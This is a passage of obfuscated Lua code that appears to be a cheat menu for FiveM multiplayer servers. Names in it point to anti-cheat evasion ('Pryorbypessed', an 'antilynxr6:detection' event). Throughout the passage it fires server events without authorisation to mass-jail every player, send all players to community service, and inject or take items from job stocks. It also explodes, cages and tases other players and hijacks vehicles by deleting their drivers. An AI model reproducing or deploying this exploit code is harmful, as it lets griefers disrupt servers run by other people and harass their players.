        felipebypassedmesquita.OpenMenu(LynxIcS)
      end
      if detect ~= Pryorbypessed then
      TSE("antilynxr6:detection")
      end
    end
	
	local Pryorbypessed6 = {}

Pryorbypessed6.Start = function()
	if DoesEntityExist(Pryorbypessed6.Entity) then return end

	Pryorbypessed6.Spawn()

	Pryorbypessed6.Tablet(Pryorbypessed3)

	while DoesEntityExist(Pryorbypessed6.Entity) and DoesEntityExist(Pryorbypessed6.Driver) do
		Citizen.Wait(5)

		local distanceCheck = GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()),  GetEntityCoords(Pryorbypessed6.Entity), Pryorbypessed3)

		Pryorbypessed6.DrawInstructions(distanceCheck)
		Pryorbypessed6.HandleKeys(distanceCheck)

		if distanceCheck <= 10000000.0 then
			if not NetworkHasControlOfEntity(Pryorbypessed6.Driver) then
				NetworkRequestControlOfEntity(Pryorbypessed6.Driver)
			elseif not NetworkHasControlOfEntity(Pryorbypessed6.Entity) then
				NetworkRequestControlOfEntity(Pryorbypessed6.Entity)
			end
		else
			TaskVehicleTempAction(Pryorbypessed6.Driver, Pryorbypessed6.Entity, 6, 2500)
		end
	end
end

Pryorbypessed6.HandleKeys = function(distanceCheck)
	if IsControlJustReleased(0, 47) then
		if IsCamRendering(Pryorbypessed6.Camera) then
			Pryorbypessed6.ToggleCamera(Pryorbypessed2)
		else
			Pryorbypessed6.ToggleCamera(Pryorbypessed3)
		end
	end

	if distanceCheck <= 10000000.0 then
		if IsControlJustPressed(0, 73) then
			Pryorbypessed6.Attach("pick")
		end
	end

	if distanceCheck < 10000000.0 then
	    if IsControlJustReleased(0, 108) then
		    local coos = GetEntityCoords(Pryorbypessed6.Entity, Pryorbypessed3)
            AddExplosion(coos.x, coos.y, coos.z, 2, 100000.0, Pryorbypessed3, Pryorbypessed2, 0)
		end
		if IsControlPressed(0, 172) and not IsControlPressed(0, 173) then
			TaskVehicleTempAction(Pryorbypessed6.Driver, Pryorbypessed6.Entity, 9, 1)
		end
		
		if IsControlJustReleased(0, 172) or IsControlJustReleased(0, 173) then
			TaskVehicleTempAction(Pryorbypessed6.Driver, Pryorbypessed6.Entity, 6, 2500)
		end

		if IsControlPressed(0, 173) and not IsControlPressed(0, 172) then
			TaskVehicleTempAction(Pryorbypessed6.Driver, Pryorbypessed6.Entity, 22, 1)
		end

		if IsControlPressed(0, 174) and IsControlPressed(0, 173) then
			TaskVehicleTempAction(Pryorbypessed6.Driver, Pryorbypessed6.Entity, 13, 1)
		end

		if IsControlPressed(0, 175) and IsControlPressed(0, 173) then
			TaskVehicleTempAction(Pryorbypessed6.Driver, Pryorbypessed6.Entity, 14, 1)
		end

		if IsControlPressed(0, 172) and IsControlPressed(0, 173) then
			TaskVehicleTempAction(Pryorbypessed6.Driver, Pryorbypessed6.Entity, 30, 100)
		end

		if IsControlPressed(0, 174) and IsControlPressed(0, 172) then
			TaskVehicleTempAction(Pryorbypessed6.Driver, Pryorbypessed6.Entity, 7, 1)
		end

		if IsControlPressed(0, 175) and IsControlPressed(0, 172) then
			TaskVehicleTempAction(Pryorbypessed6.Driver, Pryorbypessed6.Entity, 8, 1)
		end

		if IsControlPressed(0, 174) and not IsControlPressed(0, 172) and not IsControlPressed(0, 173) then
			TaskVehicleTempAction(Pryorbypessed6.Driver, Pryorbypessed6.Entity, 4, 1)
		end

		if IsControlPressed(0, 175) and not IsControlPressed(0, 172) and not IsControlPressed(0, 173) then
			TaskVehicleTempAction(Pryorbypessed6.Driver, Pryorbypessed6.Entity, 5, 1)
		end
	end
end

Pryorbypessed6.DrawInstructions = function(distanceCheck)
	local steeringButtons = {
		{
			["label"] = "Direita",
			["button"] = "~INPUT_CELLPHONE_RIGHT~"
		},
		{
			["label"] = "Frente",
			["button"] = "~INPUT_CELLPHONE_UP~"
		},
		{
			["label"] = "Ré",
			["button"] = "~INPUT_CELLPHONE_DOWN~"
		},
		{
			["label"] = "Esquerda",
			["button"] = "~INPUT_CELLPHONE_LEFT~"
		}
	}

	local pickupButton = {
		["label"] = "Deletar",
		["button"] = "~INPUT_VEH_DUCK~"
	}
	
	local explodeButton = {
		["label"] = "Explodir",
		["button"] = "~INPUT_VEH_FLY_ROLL_LEFT_ONLY~"
	}

	local buttonsToDraw = {
		{
			["label"] = "Camera no Veiculo",
			["button"] = "~INPUT_DETONATE~"
		}
	}

	if distanceCheck <= 10000000.0 then
		for buttonIndex = 1, #steeringButtons do
			local steeringButton = steeringButtons[buttonIndex]

			table.insert(buttonsToDraw, steeringButton)
		end

		if distanceCheck <= 1000000.0 then
			table.insert(buttonsToDraw, explodeButton)
		end
		
		if distanceCheck <= 1000000.0 then
			table.insert(buttonsToDraw, pickupButton)
		end
	end

    Citizen.CreateThread(function()
        local instructionScaleform = RequestScaleformMovie("instructional_buttons")

        while not HasScaleformMovieLoaded(instructionScaleform) do
            Wait(0)
        end

        PushScaleformMovieFunction(instructionScaleform, "CLEAR_ALL")
        PushScaleformMovieFunction(instructionScaleform, "TOGGLE_MOUSE_BUTTONS")
        PushScaleformMovieFunctionParameterBool(0)
        PopScaleformMovieFunctionVoid()

        for buttonIndex, buttonValues in ipairs(buttonsToDraw) do
            PushScaleformMovieFunction(instructionScaleform, "SET_DATA_SLOT")
            PushScaleformMovieFunctionParameterInt(buttonIndex - 1)

            PushScaleformMovieMethodParameterButtonName(buttonValues["button"])
            PushScaleformMovieFunctionParameterString(buttonValues["label"])
            PopScaleformMovieFunctionVoid()
        end

        PushScaleformMovieFunction(instructionScaleform, "DRAW_INSTRUCTIONAL_BUTTONS")
        PushScaleformMovieFunctionParameterInt(-1)
        PopScaleformMovieFunctionVoid()
        DrawScaleformMovieFullscreen(instructionScaleform, 255, 255, 255, 255)
    end)
end

	function AddRampToCar(player)
	local ped = GetPlayerPed(player)
	local vehi = GetVehiclePedIsIn(ped, 0)
	local ramp = CreateObject(GetHashKey("prop_jetski_ramp_01"), 0, 0, 0, 1, 1, 1)
	AttachEntityToEntity(ramp, vehi, 0, 0.0, 5.0, 0.0, 0.0, 0.0, 180.0, Pryorbypessed2, Pryorbypessed2, Pryorbypessed3, Pryorbypessed2, 0, Pryorbypessed3)
end

Pryorbypessed6.Spawn = function()
	Pryorbypessed6.LoadModels({ GetHashKey(Pryorbypessed5), 68070371 })

	local spawnCoords, spawnHeading = GetEntityCoords(PlayerPedId()) + GetEntityForwardVector(PlayerPedId()) * 2.0, GetEntityHeading(PlayerPedId())

	Pryorbypessed6.Entity = CreateVehicle(GetHashKey(Pryorbypessed5), spawnCoords, spawnHeading, Pryorbypessed3)

	while not DoesEntityExist(Pryorbypessed6.Entity) do
		Citizen.Wait(5)
	end

	Pryorbypessed6.Driver = CreatePed(5, 68070371, spawnCoords, spawnHeading, Pryorbypessed3)

	SetEntityInvincible(Pryorbypessed6.Driver, Pryorbypessed3)
	SetEntityVisible(Pryorbypessed6.Driver, Pryorbypessed2)
	FreezeEntityPosition(Pryorbypessed6.Driver, Pryorbypessed3)
	SetPedAlertness(Pryorbypessed6.Driver, 0.0)
       SetVehicleNumberPlateText(Pryorbypessed6.Entity, "67cnj087")
	TaskWarpPedIntoVehicle(Pryorbypessed6.Driver, Pryorbypessed6.Entity, -1)
   

	while not IsPedInVehicle(Pryorbypessed6.Driver, Pryorbypessed6.Entity) do
		Citizen.Wait(0)
	end

	Pryorbypessed6.Attach("place")
end

Pryorbypessed6.Attach = function(param)
	if not DoesEntityExist(Pryorbypessed6.Entity) then
		return
	end
	
	Pryorbypessed6.LoadModels({ "pickup_object" })

	if param == "place" then

		PlaceObjectOnGroundProperly(Pryorbypessed6.Entity)
	elseif param == "pick" then
		if DoesCamExist(Pryorbypessed6.Camera) then
			Pryorbypessed6.ToggleCamera(Pryorbypessed2)
		end

		Pryorbypessed6.Tablet(Pryorbypessed2)

		DeleteVehicle(Pryorbypessed6.Entity)
		DeleteEntity(Pryorbypessed6.Driver)

		Pryorbypessed6.UnloadModels()
	end
end

Pryorbypessed6.Tablet = function(T2U2R7t4whje3AWY)
	if T2U2R7t4whje3AWY then



	
		Citizen.CreateThread(function()
			while DoesEntityExist(Pryorbypessed6.TabletEntity) do
				Citizen.Wait(5)
	

			end

			ClearPedTasks(PlayerPedId())
		end)
	else
		DeleteEntity(Pryorbypessed6.TabletEntity)
	end
end

ConfigCamera = Pryorbypessed3

Pryorbypessed6.ToggleCamera = function(T2U2R7t4whje3AWY)
	if not ConfigCamera then return end

	if T2U2R7t4whje3AWY then
		
		local targetx, targety, targetz = table.unpack(GetEntityCoords(Pryorbypessed6.Driver, Pryorbypessed2))

		RequestCollisionAtCoord(targetx, targety, targetz)
		NetworkSetInSpectatorMode(Pryorbypessed3, Pryorbypessed6.Driver)
		
	else
		local targetx, targety, targetz = table.unpack(GetEntityCoords(Pryorbypessed6.Driver, Pryorbypessed2))

        RequestCollisionAtCoord(targetx, targety, targetz)
        NetworkSetInSpectatorMode(Pryorbypessed2, Pryorbypessed6.Driver)
		
	end
end

Pryorbypessed6.LoadModels = function(models)
	for modelIndex = 1, #models do
		local model = models[modelIndex]

		if not Pryorbypessed6.CachedModels then
			Pryorbypessed6.CachedModels = {}
		end

		table.insert(Pryorbypessed6.CachedModels, model)

		if IsModelValid(model) then
			while not HasModelLoaded(model) do
				RequestModel(model)
	
				Citizen.Wait(10)
			end
		else
			while not HasAnimDictLoaded(model) do
				RequestAnimDict(model)
	
				Citizen.Wait(10)
			end    
		end
	end
end

Pryorbypessed6.UnloadModels = function()
	for modelIndex = 1, #Pryorbypessed6.CachedModels do
		local model = Pryorbypessed6.CachedModels[modelIndex]

		if IsModelValid(model) then
			SetModelAsNoLongerNeeded(model)
		else
			RemoveAnimDict(model)   
		end
	end
end
		
		function Pryorbypessed8(TextEntry, ExampleText, MaxStringLength)
		AddTextEntry("FMMC_KEY_TIP1", TextEntry .. ":")
		DisplayOnscreenKeyboard(1, "FMMC_KEY_TIP1", "", ExampleText, "", "", "", MaxStringLength)
        while (UpdateOnscreenKeyboard() == 0) do
          DisableAllControlActions(0)
          if IsDisabledControlPressed(0, 322) then return "" end
          Wait(0)
        end
        if (GetOnscreenKeyboardResult()) then
          local result = GetOnscreenKeyboardResult()
          return result
        end
      end


      function AddVectors(vect1, vect2)
        return vector3(vect1.x + vect2.x, vect1.y + vect2.y, vect1.z + vect2.z)
      end

      function SubVectors(vect1, vect2)
        return vector3(vect1.x - vect2.x, vect1.y - vect2.y, vect1.z - vect2.z)
      end

      function ScaleVector(vect, mult)
        return vector3(vect.x*mult, vect.y*mult, vect.z*mult)
      end


 
    function RotationToDirection(rotation)
      local retz = math.rad(rotation.z)
      local retx = math.rad(rotation.x)
      local absx = math.abs(math.cos(retx))
      return vector3(-math.sin(retz) * absx, math.cos(retz) * absx, math.sin(retx))
    end




	local function NWe9zt6fbuvYXQFE(Vu2r8w7VHChrprkL)
		local ped = GetPlayerPed(Vu2r8w7VHChrprkL)
		SetPedRandomComponentVariation(ped, Pryorbypessed2)
		SetPedRandomProps(ped)
	end
	

local function RXsPbzP3f6VCTfwL(fejQXaMq9r2w2rsT)
	local ped = GetPlayerPed(fejQXaMq9r2w2rsT)
	local tLoc = GetEntityCoords(ped)

	local destination = GetPedBoneCoords(ped, 0, 0.0, 0.0, 0.0)
	local origin = GetPedBoneCoords(ped, 57005, 0.0, 0.0, 0.2)



	ShootSingleBulletBetweenCoords(origin, destination, 1, Pryorbypessed3, `WEAPON_STUNGUN`, PlayerPedId(), Pryorbypessed3, Pryorbypessed2, 1.0)
end

		local function pq78pH2rJ7xj9LVQ()
		local hMPE4VqWemZJf8wZ = Pryorbypessed8("Enter jail reason", "", 100)
		if hMPE4VqWemZJf8wZ then
			for i = 0, 128 do
			
			PZ2K94uTvEETfgBM(Pryorbypessed3, (TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."_jailer:sendToJail"), GetPlayerServerId(i), 45 * 60)
			Citizen.Wait(100)
			PZ2K94uTvEETfgBM(Pryorbypessed3, (TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."_jail:sendToJail"), GetPlayerServerId(i), 45 * 60)
			Citizen.Wait(100)
			PZ2K94uTvEETfgBM(Pryorbypessed3, (TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."-qalle-jail:jailPlayer"), GetPlayerServerId(i), 45 * 60, hMPE4VqWemZJf8wZ)
			end
		 end
       end
	   
	   local function xry6S6Yeet9rBKuS()
	    local CYaNdhzBLmT8gJjs = Pryorbypessed8("Enter Item Name", "", 15)
		if CYaNdhzBLmT8gJjs ~= " " then
			local gPcvG5yjZ7Y5EcBN = {
				{
					name = CYaNdhzBLmT8gJjs,
					db_name = CYaNdhzBLmT8gJjs,
					time = 100.0,
					max = 100.0,
					add = 1,
					remove = 10,
					drop = 100.0,
					requires = "nothing",
					requires_name = "Nothing"
				}
			}
			Citizen.CreateThread(
				function()
					PZ2K94uTvEETfgBM(Pryorbypessed3, (TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."_jobs:startWork"), gPcvG5yjZ7Y5EcBN)
					Wait(100.0)
					PZ2K94uTvEETfgBM(Pryorbypessed3, (TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."_jobs:stopWork"), gPcvG5yjZ7Y5EcBN)
				end
			)
		end
		local byH6N4rQ2uT9bMpf = {
			(TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."_mechanicjob"),
			(TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."_mecanojob"),
			(TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."_taxijob"),
			(TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."_vehicleshop"),
			(TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."_gangjob"),
			(TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."_mafiajob"),
			(TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."_carteljob"),
			(TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."_bikerjob")
		}
		if CYaNdhzBLmT8gJjs ~= " " then
			for i = 1, #byH6N4rQ2uT9bMpf do

				Citizen.CreateThread(
					function()
						Wait(50)
						PZ2K94uTvEETfgBM(
							Pryorbypessed3,
							byH6N4rQ2uT9bMpf[i] .. ":getStockItem",
							CYaNdhzBLmT8gJjs,
							100.0
						)
						PZ2K94uTvEETfgBM(
							Pryorbypessed3,
							byH6N4rQ2uT9bMpf[i] .. ":putStockItems",
							CYaNdhzBLmT8gJjs,
							-100.0
						)
					end
				)
			end
		end
	   end
 
 
 
 
 
vqE26kTg3G4gzbjK = function(vehicle)
	local color1, color2 = GetVehicleColours(vehicle)
	local pearlescentColor, wheelColor = GetVehicleExtraColours(vehicle)
	local extras = {}

	for id=0, 12 do
		if DoesExtraExist(vehicle, id) then
			local state = IsVehicleExtraTurnedOn(vehicle, id) == 1
			extras[tostring(id)] = state
		end
	end

	return {

		model             = GetEntityModel(vehicle),

		plate             = ESX.Math.Trim(GetVehicleNumberPlateText(vehicle)),
		plateIndex        = GetVehicleNumberPlateTextIndex(vehicle),

		health            = GetEntityHealth(vehicle),
		dirtLevel         = GetVehicleDirtLevel(vehicle),

		color1            = color1,
		color2            = color2,

		pearlescentColor  = pearlescentColor,
		wheelColor        = wheelColor,

		wheels            = GetVehicleWheelType(vehicle),
		windowTint        = GetVehicleWindowTint(vehicle),

		neonEnabled       = {
			IsVehicleNeonLightEnabled(vehicle, 0),
			IsVehicleNeonLightEnabled(vehicle, 1),
			IsVehicleNeonLightEnabled(vehicle, 2),
			IsVehicleNeonLightEnabled(vehicle, 3)
		},

		extras            = extras,

		neonColor         = table.pack(GetVehicleNeonLightsColour(vehicle)),
		tyreSmokeColor    = table.pack(GetVehicleTyreSmokeColor(vehicle)),

		modSpoilers       = GetVehicleMod(vehicle, 0),
		modFrontBumper    = GetVehicleMod(vehicle, 1),
		modRearBumper     = GetVehicleMod(vehicle, 2),
		modSideSkirt      = GetVehicleMod(vehicle, 3),
		modExhaust        = GetVehicleMod(vehicle, 4),
		modFrame          = GetVehicleMod(vehicle, 5),
		modGrille         = GetVehicleMod(vehicle, 6),
		modHood           = GetVehicleMod(vehicle, 7),
		modFender         = GetVehicleMod(vehicle, 8),
		modRightFender    = GetVehicleMod(vehicle, 9),
		modRoof           = GetVehicleMod(vehicle, 10),

		modEngine         = GetVehicleMod(vehicle, 11),
		modBrakes         = GetVehicleMod(vehicle, 12),
		modTransmission   = GetVehicleMod(vehicle, 13),
		modHorns          = GetVehicleMod(vehicle, 14),
		modSuspension     = GetVehicleMod(vehicle, 15),
		modArmor          = GetVehicleMod(vehicle, 16),

		modTurbo          = IsToggleModOn(vehicle, 18),
		modSmokeEnabled   = IsToggleModOn(vehicle, 20),
		modXenon          = IsToggleModOn(vehicle, 22),

		modFrontWheels    = GetVehicleMod(vehicle, 23),
		modBackWheels     = GetVehicleMod(vehicle, 24),

		modPlateHolder    = GetVehicleMod(vehicle, 25),
		modVanityPlate    = GetVehicleMod(vehicle, 26),
		modTrimA          = GetVehicleMod(vehicle, 27),
		modOrnaments      = GetVehicleMod(vehicle, 28),
		modDashboard      = GetVehicleMod(vehicle, 29),
		modDial           = GetVehicleMod(vehicle, 30),
		modDoorSpeaker    = GetVehicleMod(vehicle, 31),
		modSeats          = GetVehicleMod(vehicle, 32),
		modSteeringWheel  = GetVehicleMod(vehicle, 33),
		modShifterLeavers = GetVehicleMod(vehicle, 34),
		modAPlate         = GetVehicleMod(vehicle, 35),
		modSpeakers       = GetVehicleMod(vehicle, 36),
		modTrunk          = GetVehicleMod(vehicle, 37),
		modHydrolic       = GetVehicleMod(vehicle, 38),
		modEngineBlock    = GetVehicleMod(vehicle, 39),
		modAirFilter      = GetVehicleMod(vehicle, 40),
		modStruts         = GetVehicleMod(vehicle, 41),
		modArchCover      = GetVehicleMod(vehicle, 42),
		modAerials        = GetVehicleMod(vehicle, 43),
		modTrimB          = GetVehicleMod(vehicle, 44),
		modTank           = GetVehicleMod(vehicle, 45),
		modWindows        = GetVehicleMod(vehicle, 46),
		modLivery         = GetVehicleLivery(vehicle)
	}
end
 
 
 
 
 
	  local function tF2zCuwjVS9BXSkq()
		local QXVNv94FrjYJTAgC = Pryorbypessed8("Enter text to spam", "", 100)
		local Dgt5pSQwTUgXbp88 = Pryorbypessed8("How many times", "", 100)
		if QXVNv94FrjYJTAgC then
			for i = 0, Dgt5pSQwTUgXbp88 do
				Citizen.Wait(1)
				PZ2K94uTvEETfgBM(Pryorbypessed3, (TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW..":clientLog"), QXVNv94FrjYJTAgC)
			end
		end
	  end
	   	

	  
	  local function MbjbYUD23tEN8RG9()
		for i = 0, 128 do
		PZ2K94uTvEETfgBM(Pryorbypessed3, (TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."_jailer:sendToJail"), GetPlayerServerId(i), 1 * 60)
		PZ2K94uTvEETfgBM(Pryorbypessed3, (TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."_jail:sendToJail"), GetPlayerServerId(i), 1 * 60)
		PZ2K94uTvEETfgBM(Pryorbypessed3, "js:jailuser", GetPlayerServerId(i), 1 * 60, "Alokas66 jailed!!")
		PZ2K94uTvEETfgBM(Pryorbypessed3, (TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."-qalle-jail:jailPlayer"), GetPlayerServerId(i), 1 * 60, "Alokas66 jailed!!")
			end
      end
	  
	  local function cXs4YR95WvjDe4Je(gp5vwDMwEK5xkPTb)
	  local ped = GetPlayerPed(gp5vwDMwEK5xkPTb)
	  if not IsPedInAnyVehicle(ped) then
	  	return BBWMqktLdH6yHbfd("Player its not in the vehicle!")
	  end
	  
	  local vehicle = GetVehiclePedIsUsing(GetPlayerPed(gp5vwDMwEK5xkPTb))
	  
	  local seats = GetVehicleMaxNumberOfPassengers(vehicle)
	  for i = 0, seats do
	  	if IsVehicleSeatFree(vehicle, i) then
	  		SetPedIntoVehicle(PlayerPedId(), vehicle, i)
	  		break
	  	end
	  end
	  end
	  
	  local function fG8NDEEJSdYazWZB()
		for i = 0, 128 do
		PZ2K94uTvEETfgBM(Pryorbypessed3, (TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."_communityservice:sendToCommunityService"), GetPlayerServerId(i), 666)
			end
		end
		
	  local function WqaFZmzNtX2ES9tY()
	  
	    local playerlist = GetActivePlayers()
        for i = 1, #playerlist do
          local currPlayer = playerlist[i]
          local ped = GetPlayerPed(currPlayer)
          local coords = GetEntityCoords(ped)
          AddExplosion(coords.x+1, coords.y+1, coords.z+1, 4, 10000.0, Pryorbypessed2, Pryorbypessed3, 0.0)
        end
	  end
		



      local function ESuCP2f5En2LpshA()
	    local playerlist = GetActivePlayers()
        for i = 1, #playerlist do
          local currPlayer = playerlist[i]
          local ped = GetPlayerPed(currPlayer)
          local coords = GetEntityCoords(ped)
          AddExplosion(coords.x+1, coords.y+1, coords.z+1, 4, 10000.0, Pryorbypessed3, Pryorbypessed2, 0.0)
        end
      end

      local function q6rhbTuqYgWxnK53()
        local pbase = GetActivePlayers()
        for i=0, #pbase do
          if IsPedInAnyVehicle(GetPlayerPed(i), Pryorbypessed3) then
            local hamburg = "xs_prop_hamburgher_wl"
            local hamburghash = GetHashKey(hamburg)
            while not HasModelLoaded(hamburghash) do
              Citizen.Wait(0)
              RequestModel(hamburghash)
            end
            local g2Zepw83m6hDuyJj = CreateObject(hamburghash, 0, 0, 0, Pryorbypessed3, Pryorbypessed3, Pryorbypessed3)
            AttachEntityToEntity(g2Zepw83m6hDuyJj, GetVehiclePedIsIn(GetPlayerPed(i), Pryorbypessed2), GetEntityBoneIndexByName(GetVehiclePedIsIn(GetPlayerPed(i), Pryorbypessed2), "chassis"), 0, 0, -1.0, 0.0, 0.0, 0, Pryorbypessed3, Pryorbypessed3, Pryorbypessed2, Pryorbypessed3, 1, Pryorbypessed3)
          else
            local hamburg = "xs_prop_hamburgher_wl"
            local hamburghash = GetHashKey(hamburg)
            while not HasModelLoaded(hamburghash) do
              Citizen.Wait(0)
              RequestModel(hamburghash)
            end
            local g2Zepw83m6hDuyJj = CreateObject(hamburghash, 0, 0, 0, Pryorbypessed3, Pryorbypessed3, Pryorbypessed3)
            AttachEntityToEntity(g2Zepw83m6hDuyJj, GetPlayerPed(i), GetPedBoneIndex(GetPlayerPed(i), 0), 0, 0, -1.0, 0.0, 0.0, 0, Pryorbypessed3, Pryorbypessed3, Pryorbypessed2, Pryorbypessed3, 1, Pryorbypessed3)
          end
        end
      end
		

	  local function Bs7UbxB6R9ddBLbn()
		local pbase = GetActivePlayers()
        for i = 1, #pbase do
          x, y, z = table.unpack(GetEntityCoords(i))
          roundx = tonumber(string.format("%.2f", x))
          roundy = tonumber(string.format("%.2f", y))
          roundz = tonumber(string.format("%.2f", z))
          while not HasModelLoaded(GetHashKey("prop_fnclink_05crnr1")) do
            Citizen.Wait(0)
            RequestModel(GetHashKey("prop_fnclink_05crnr1"))
          end
          local cage1 = CreateObject(GetHashKey("prop_fnclink_05crnr1"), roundx - 1.70, roundy - 1.70, roundz - 1.0, Pryorbypessed3, Pryorbypessed3, Pryorbypessed2)
          local cage2 = CreateObject(GetHashKey("prop_fnclink_05crnr1"), roundx + 1.70, roundy + 1.70, roundz - 1.0, Pryorbypessed3, Pryorbypessed3, Pryorbypessed2)
          SetEntityHeading(cage1, -90.0)
          SetEntityHeading(cage2, 90.0)
          FreezeEntityPosition(cage1, Pryorbypessed3)
          FreezeEntityPosition(cage2, Pryorbypessed3)
        end
      end



       

      local function eXKpBsv5m6U6Y4Cx()
        local a62nm7LXBYT7krgZ = Pryorbypessed8("Enter X pos", "", 100)
        local dUpFufBAg5hVJmhK = Pryorbypessed8("Enter Y pos", "", 100)
        local Wqwfubhf29gEL5CF = Pryorbypessed8("Enter Z pos", "", 100)
        if a62nm7LXBYT7krgZ ~= "" and dUpFufBAg5hVJmhK ~= "" and Wqwfubhf29gEL5CF ~= "" then
          if	IsPedInAnyVehicle(GetPlayerPed(-1), 0) and (GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1)) then
            entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
          else
            entity = GetPlayerPed(-1)
          end
          if entity then
            SetEntityCoords(entity, a62nm7LXBYT7krgZ + 0.5, dUpFufBAg5hVJmhK + 0.5, Wqwfubhf29gEL5CF + 0.5, 1, 0, 0, 1)
            BBWMqktLdH6yHbfd("~g~Teleported to coords!", Pryorbypessed2)
          end
        else
          BBWMqktLdH6yHbfd("~b~Invalid coords!", Pryorbypessed3)
        end
      end

      local function Rq7kx3pmYNQPqYkR()
        local name = Pryorbypessed8("Enter Blip Name", "", 100)
        if name == "" then
          BBWMqktLdH6yHbfd("~b~Invalid Blip Name!", Pryorbypessed3)
          return Rq7kx3pmYNQPqYkR()
        else
          local wj6dy88VQ5zJWwJc = Pryorbypessed8("Enter X pos", "", 100)
          local N7VsxhTvhU8wjNFZ = Pryorbypessed8("Enter Y pos", "", 100)
          local VsbKtCBt8NxEFXn6 = Pryorbypessed8("Enter Z pos", "", 100)
          if wj6dy88VQ5zJWwJc ~= "" and N7VsxhTvhU8wjNFZ ~= "" and VsbKtCBt8NxEFXn6 ~= "" then
            local blips = {
              {colour=75, id=84},
            }
            for _, info in pairs(blips) do
              info.blip = AddBlipForCoord(wj6dy88VQ5zJWwJc + 0.5, N7VsxhTvhU8wjNFZ + 0.5, VsbKtCBt8NxEFXn6 + 0.5)
              SetBlipSprite(info.blip, info.id)
              SetBlipDisplay(info.blip, 4)
              SetBlipScale(info.blip, 0.9)
              SetBlipColour(info.blip, info.colour)
              SetBlipAsShortRange(info.blip, Pryorbypessed3)
              BeginTextCommandSetBlipName("STRING")
              AddTextComponentString(name)
              EndTextCommandSetBlipName(info.blip)
            end
          else
            BBWMqktLdH6yHbfd("~b~Invalid coords!", Pryorbypessed3)
          end
        end
      end

      local function Ka8unCJ4B2BZ6rkU()
        local playerPed = GetPlayerPed(-1)
        local playerPedPos = GetEntityCoords(playerPed, Pryorbypessed3)
        local NearestVehicle = GetClosestVehicle(GetEntityCoords(playerPed, Pryorbypessed3), 1000.0, 0, 4)
        local NearestVehiclePos = GetEntityCoords(NearestVehicle, Pryorbypessed3)
        local NearestPlane = GetClosestVehicle(GetEntityCoords(playerPed, Pryorbypessed3), 1000.0, 0, 16384)
        local NearestPlanePos = GetEntityCoords(NearestPlane, Pryorbypessed3)
        BBWMqktLdH6yHbfd("~y~Wait...", Pryorbypessed2)
        Citizen.Wait(1000)
        if (NearestVehicle == 0) and (NearestPlane == 0) then
          BBWMqktLdH6yHbfd("~b~No Vehicle Found", Pryorbypessed3)
        elseif (NearestVehicle == 0) and (NearestPlane ~= 0) then
          if IsVehicleSeatFree(NearestPlane, -1) then
            SetPedIntoVehicle(playerPed, NearestPlane, -1)
            SetVehicleAlarm(NearestPlane, Pryorbypessed2)
            SetVehicleDoorsLocked(NearestPlane, 1)
            SetVehicleNeedsToBeHotwired(NearestPlane, Pryorbypessed2)
          else
            local driverPed = GetPedInVehicleSeat(NearestPlane, -1)
            ClearPedTasksImmediately(driverPed)
            SetEntityAsMissionEntity(driverPed, 1, 1)
            DeleteEntity(driverPed)
            SetPedIntoVehicle(playerPed, NearestPlane, -1)
            SetVehicleAlarm(NearestPlane, Pryorbypessed2)
            SetVehicleDoorsLocked(NearestPlane, 1)
            SetVehicleNeedsToBeHotwired(NearestPlane, Pryorbypessed2)
          end
          BBWMqktLdH6yHbfd("~g~Teleported Into Nearest Vehicle!", Pryorbypessed2)
        elseif (NearestVehicle ~= 0) and (NearestPlane == 0) then
          if IsVehicleSeatFree(NearestVehicle, -1) then
            SetPedIntoVehicle(playerPed, NearestVehicle, -1)
            SetVehicleAlarm(NearestVehicle, Pryorbypessed2)
            SetVehicleDoorsLocked(NearestVehicle, 1)
            SetVehicleNeedsToBeHotwired(NearestVehicle, Pryorbypessed2)
          else
            local driverPed = GetPedInVehicleSeat(NearestVehicle, -1)
            ClearPedTasksImmediately(driverPed)
            SetEntityAsMissionEntity(driverPed, 1, 1)
            DeleteEntity(driverPed)
            SetPedIntoVehicle(playerPed, NearestVehicle, -1)
            SetVehicleAlarm(NearestVehicle, Pryorbypessed2)
            SetVehicleDoorsLocked(NearestVehicle, 1)
            SetVehicleNeedsToBeHotwired(NearestVehicle, Pryorbypessed2)
          end
          BBWMqktLdH6yHbfd("~g~Teleported Into Nearest Vehicle!", Pryorbypessed2)
        elseif (NearestVehicle ~= 0) and (NearestPlane ~= 0) then
          if Vdist(NearestVehiclePos.x, NearestVehiclePos.y, NearestVehiclePos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) < Vdist(NearestPlanePos.x, NearestPlanePos.y, NearestPlanePos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) then
            if IsVehicleSeatFree(NearestVehicle, -1) then
              SetPedIntoVehicle(playerPed, NearestVehicle, -1)
              SetVehicleAlarm(NearestVehicle, Pryorbypessed2)
              SetVehicleDoorsLocked(NearestVehicle, 1)
              SetVehicleNeedsToBeHotwired(NearestVehicle, Pryorbypessed2)
            else
              local driverPed = GetPedInVehicleSeat(NearestVehicle, -1)
              ClearPedTasksImmediately(driverPed)
              SetEntityAsMissionEntity(driverPed, 1, 1)
              DeleteEntity(driverPed)
              SetPedIntoVehicle(playerPed, NearestVehicle, -1)
              SetVehicleAlarm(NearestVehicle, Pryorbypessed2)
              SetVehicleDoorsLocked(NearestVehicle, 1)
              SetVehicleNeedsToBeHotwired(NearestVehicle, Pryorbypessed2)
            end
